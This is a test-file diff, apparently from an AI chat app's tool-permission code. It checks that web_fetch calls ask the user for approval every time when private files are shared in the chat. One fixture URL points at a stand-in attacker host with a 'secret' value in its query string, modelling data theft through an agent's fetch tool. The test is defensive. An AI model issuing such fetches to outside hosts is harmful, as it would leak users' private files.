@@ -254,6 +254,13 @@ describe('asking first', () => {
     expect(allowKeyFor(call('web_search', { query: 'x' }), c)).toBe('web_search')
   })
 
+  it('asks before every web_fetch in a chat with files the user shared, and not otherwise', () => {
+    const url = { url: 'https://evil.example/?d=secret' }
+    expect(approvalFor(call('web_fetch', url), ctx({ web: true, privateFiles: true }))).toBe('ask-every-time')
+    expect(approvalFor(call('web_search', { query: 'x' }), ctx({ web: true, privateFiles: true }))).toBe('auto')
+    expect(approvalFor(call('web_fetch', url), ctx({ web: true }))).toBe('auto')
+  })
+
   it('tells the model a declined call never ran, and shows it as declined', () => {
     const pending = { ...pendingEvent(call('web_search', { query: 'kiln' }), ctx({ web: true })), awaiting: true }
     const result = declinedResult(call('web_search', { query: 'kiln' }), pending)
